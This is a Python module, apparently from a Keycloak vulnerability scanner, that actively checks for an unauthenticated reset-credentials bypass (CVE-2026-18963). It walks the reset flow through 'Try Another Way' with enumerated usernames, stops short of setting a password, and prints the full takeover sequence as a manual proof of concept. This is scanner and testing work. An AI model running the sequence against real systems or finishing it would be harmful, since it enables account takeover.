#!/usr/bin/env python3
"""CVE-2026-18963 — active unauthenticated reset-credentials bypass test.

Root cause (fix PR #51844, commit cf6e4c8): ResetCredentialEmail.action() called
context.success() unconditionally. By driving the reset-credentials flow through
the "Try Another Way" authenticator selector, the email step succeeds WITHOUT the
action token from the verification email being consumed — the flow advances
straight to the UPDATE_PASSWORD form, letting an unauthenticated attacker who only
knows a username set a new password (account takeover).

Affected: Keycloak 26.0.0–26.7.1 (fixed 26.7.2 / 26.6.6 / 26.4.15).

This test reproduces the sequence up to — but NOT including — setting a new
password. It never submits password-new/password-confirm, so no account is taken
over. It DOES send one reset-password email per tested user (unavoidable, the
selector step triggers it), so it only runs against usernames that are explicitly
provided (--reset-user) or already confirmed valid by enumeration.

Detection: after tryAnotherWay -> select email -> submit username, re-request the
reset URL. A vulnerable server serves the update-password form (password-new /
password-confirm) with no email link clicked; a patched server stays on the
"email sent" page or returns INVALID_USER.
"""

import re
from urllib.parse import urljoin

from bs4 import BeautifulSoup

from utils.style import Colors, Identify
from utils.output import get_reporter
from utils.utils import args

# Markers that indicate the flow reached the password-update step
_UPDATE_MARKERS = (
    "password-new",
    "password-confirm",
    "kc-passwd-update-form",
    "login-update-password",
)
# Markers of the "Try Another Way" / credential-selector screen
_SELECTOR_MARKERS = (
    "kc-select-credential-form",
    "authenticationExecution",
    "authexec-hidden-input",
)
# Only meaningful below this fixed mainline version
_AFFECTED_BELOW = (26, 7, 2)
_MAX_USERS = 5


def _parse_ver(v):
    try:
        return tuple(int(x) for x in v.split(".")[:3])
    except Exception:
        return (0, 0, 0)


def _forms(html, page_url):
    """Return [{action, inputs:{name:value}, id, text}] for every <form>."""
    out = []
    try:
        soup = BeautifulSoup(html, "html.parser")
    except Exception:
        return out
    for f in soup.find_all("form"):
        action = f.get("action") or page_url
        inputs = {}
        for inp in f.find_all(["input", "button"]):
            name = inp.get("name")
            if name:
                inputs[name] = inp.get("value", "") or ""
        out.append({
            "action": urljoin(page_url, action.replace("&amp;", "&")),
            "inputs": inputs,
            "id": f.get("id", "") or "",
            "text": str(f),
        })
    return out


def _pick_form(forms, id_hint=None, has_input=None):
    for f in forms:
        if id_hint and id_hint in f["id"]:
            return f
    for f in forms:
        if has_input and any(has_input in n for n in f["inputs"]):
            return f
    return forms[0] if forms else None


def _collect_usernames(reporter):
    """Explicit --reset-user plus valid users found by the enumeration module."""
    users = []
    for u in (getattr(args, "reset_users", None) or []):
        if u and u not in users:
            users.append(u)
    if reporter:
        for f in reporter.findings:
            if f.get("category") == "UserEnum":
                # titles look like "Valid user found: admin" / "Valid user (disabled): x"
                name = f.get("title", "").split(":")[-1].strip()
                if name and name not in users:
                    users.append(name)
    return users[:_MAX_USERS]


def _reached_update_form(text):
    low = text.lower()
    return any(m in low for m in _UPDATE_MARKERS)


def _is_selector(text):
    return any(m in text for m in _SELECTOR_MARKERS)


def _test_one(s, realm, client_id, username):
    """Drive the flow for one username. Return (confirmed, detail)."""
    # 1. Land on the reset-credentials page (initialises an auth session + cookies)
    try:
        r = s.get(f"{realm}/login-actions/reset-credentials",
                  params={"client_id": client_id}, allow_redirects=True)
    except Exception:
        return False, None
    if r.status_code != 200:
        return False, None
    reset_url = r.url  # carries session_code / execution / tab_id

    forms = _forms(r.text, reset_url)
    reset_form = _pick_form(forms, has_input="username")
    if not reset_form:
        return False, None

    # 2. POST tryAnotherWay=on to reach the authenticator-selector screen
    data = dict(reset_form["inputs"])
    data["tryAnotherWay"] = "on"
    try:
        r2 = s.post(reset_form["action"], data=data, allow_redirects=True)
    except Exception:
        return False, None
    if not _is_selector(r2.text):
        # Selector not offered (single credential type) — cannot drive this path
        return False, None

    # 3. Submit the email authenticator selection carrying the target username
    sel_form = _pick_form(_forms(r2.text, r2.url), id_hint="kc-select-credential-form")
    if not sel_form:
        return False, None
    data = dict(sel_form["inputs"])
    data["username"] = username
    try:
        s.post(sel_form["action"], data=data, allow_redirects=True)
    except Exception:
        return False, None

    # 4. Re-request the reset URL: vulnerable → update-password form is now served
    try:
        r4 = s.get(reset_url, allow_redirects=True)
    except Exception:
        return False, None
    if _reached_update_form(r4.text):
        return True, ("update-password form served without consuming an email "
                      "action-token — flow advanced past ResetCredentialEmail")
    return False, None


def test_reset_credentials_bypass(s, realms, client_ids, version=None):
    if getattr(args, "no_reset_test", False):
        return

    reporter = get_reporter()
    usernames = _collect_usernames(reporter)

    print(f"{Colors.CYAN} ├ CVE-2026-18963 Reset-Credentials Bypass (active) {Colors.RESET}")

    if not usernames:
        print(f"  └── {Colors.THISTLE}No target username — provide one with --reset-user "
              f"(or enable enumeration){Colors.RESET}")
        return

    if version:
        detected = _parse_ver(version.strip().lstrip("<=> ").split(" ")[0].split("+")[0])
        if detected != (0, 0, 0) and detected >= _AFFECTED_BELOW:
            print(f"  └── {Colors.GREEN}[OK] Version {version} >= 26.7.2 — patched, "
                  f"skipping active test{Colors.RESET}")
            return

    print(f"  {Colors.THISTLE}[i] Sends one reset email per user tested "
          f"(never sets a new password).{Colors.RESET}")
    print(f"  Testing {len(usernames)} user(s): {', '.join(usernames)}")

    test_clients = list(client_ids) if client_ids else ["account"]
    confirmed_any = False

    for realm in realms:
        realm = realm.rstrip("/")
        for username in usernames:
            hit = False
            for cid in test_clients:
                try:
                    ok, detail = _test_one(s, realm, cid, username)
                except Exception:
                    continue
                if ok:
                    hit = True
                    confirmed_any = True
                    print(f"  └── {Identify.confirmed}")
                    print(f"         CONFIRMED — realm: {realm}  client: {cid}  user: {username}")
                    print(f"         Detail: {detail}")
                    if reporter:
                        reporter.add(
                            "CVE", "critical",
                            f"CVE-2026-18963 CONFIRMED: unauth reset-credentials bypass — user '{username}'",
                            f"{realm}/login-actions/reset-credentials",
                            f"client_id={cid} | {detail} | account takeover without email verification",
                        )
                    break  # this user is confirmed on this realm
            if not hit:
                print(f"  └── {Colors.GREEN}[TEST] '{username}' not reproduced "
                      f"(tested {len(test_clients)} client(s) on {realm}){Colors.RESET}")

    if confirmed_any:
        base = realms[0].split("/realms/")[0] if realms and "/realms/" in realms[0] else ""
        print(f"  {Colors.RED}[!] Manual PoC: drive reset-credentials with tryAnotherWay -> "
              f"select email -> submit username, then GET the reset URL to reach the "
              f"password-update form. {base}{Colors.RESET}")
